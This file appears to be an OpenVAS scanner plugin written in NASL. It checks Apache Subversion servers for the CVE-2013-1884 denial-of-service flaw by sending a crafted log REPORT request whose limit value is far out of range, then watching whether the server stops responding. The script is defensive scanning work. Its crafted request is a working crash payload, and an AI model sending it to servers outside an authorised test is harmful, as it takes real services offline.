###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_subversion_log_report_dos_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Apache Subversion 'mod_dav_svn' log REPORT Request DoS Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802054");
  script_version("$Revision: 13659 $");
  script_bugtraq_id(58898);
  script_cve_id("CVE-2013-1884");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2013-06-06 15:08:09 +0530 (Thu, 06 Jun 2013)");
  script_name("Apache Subversion 'mod_dav_svn' log REPORT Request DoS Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/52966/");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/83259");
  script_xref(name:"URL", value:"http://subversion.apache.org/security/CVE-2013-1884-advisory.txt");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Apache_SVN/banner");

  script_tag(name:"affected", value:"Apache Subversion 1.7.0 through 1.7.8");

  script_tag(name:"insight", value:"An error within the 'mod_dav_svn' module when handling crafted log 'REPORT'
  request with a limit outside the allowed range.");

  script_tag(name:"solution", value:"Upgrade to Apache Subversion version 1.7.9 or later.");

  script_tag(name:"summary", value:"The host is running Apache Subversion and is prone denial of
  service vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will let the remote attackers to cause a segfault
  by sending crafted log 'REPORT' request.

  NOTE : Configurations which allow anonymous read access to the repository
  will be vulnerable to this without authentication.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

h_port = get_http_port(default:80);

banner = get_http_banner(port: h_port);
if(!banner || banner !~ "Server: Apache.* SVN"){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:h_port);

if(http_is_dead(port:h_port)) exit(0);

comman_data = string('<?xml version="1.0" encoding="UTF-8"?>\n',
                     '<S:log-report xmlns:S="svn:">\n',
                     '<S:start-revision>0</S:start-revision>\n',
                     '<S:end-revision>1</S:end-revision>\n');

## limit proper allowed range.
limit_inside = string(comman_data, '<S:limit>1</S:limit>\n',
                      '</S:log-report>\n');

## limit outside the allowed range.
limit_outside = string(comman_data,
                       '<S:limit>123456789123456789123456789</S:limit>\n',
                       '</S:log-report>\n');

foreach path (make_list_unique("/", "/repo/", "/repository/", "/trunk/", "/svn/", "/svn/trunk/",
                        "/repo/trunk/", "/repo/projects/", "/projects/", "/svn/repos/", cgi_dirs(port:h_port)))
{
  req1 = http_get(item:string(path), port:h_port);
  res1 = http_keepalive_send_recv(port:h_port, data:req1);

  if((res1 !~ "HTTP/1.. 200 OK")){
    continue;
  }

  ## Send normal request and check for normal response to confirm
  ## Subversion is working as expected
  common_req = string("REPORT ", path, '!svn/bc/1/', " HTTP/1.1","\r\n",
                      "User-Agent: ", useragent, "\r\n",
                      "Host: ", host, "\r\n",
                      "Accept: */*\r\n");

  normal_req = string(common_req, "Content-Length: ", strlen(limit_inside),
                                                 "\r\n\r\n", limit_inside);
  normal_res = http_keepalive_send_recv(port:h_port, data:normal_req);

  if((normal_res !~ "HTTP/1.. 200 OK" && "<S:log-report" >!< normal_res)){
    continue;
  }

  ## Some time Apache servers will re-spawn the listener processes
  ## send crafted limit that is out of the allowed range
  ## and check for the response. If no response than Segmentation fault
  ## occurred
  crafted_req = string(common_req, "Content-Length: ", strlen(limit_outside),
                                                  "\r\n\r\n", limit_outside);
  crafted_res = http_keepalive_send_recv(port:h_port, data:crafted_req);

  ## patched version repose HTTP/1.1 400 Bad Request
  ## and human-readable errcode=
  if((crafted_res =~ "HTTP/1.. 400 OK" &&
      "human-readable errcode=" >< crafted_res)){
    exit(0);
  }

  ## some times response has "\r\n" hence check strlen(crafted_res) < 3
  ## nb: Trying 2 times to make sure the server is not responding
  if(isnull(crafted_res) || strlen(crafted_res) < 3)
  {
    crafted_res = http_keepalive_send_recv(port:h_port, data:crafted_req);
    if(isnull(crafted_res) || strlen(crafted_res) < 3)
    {
      security_message(port:h_port);
      exit(0);
    }
  }

  ## If http did not re-spawn the listener processes
  if(http_is_dead(port:h_port))
  {
    security_message(port:h_port);
    exit(0);
  }
}

exit(99);
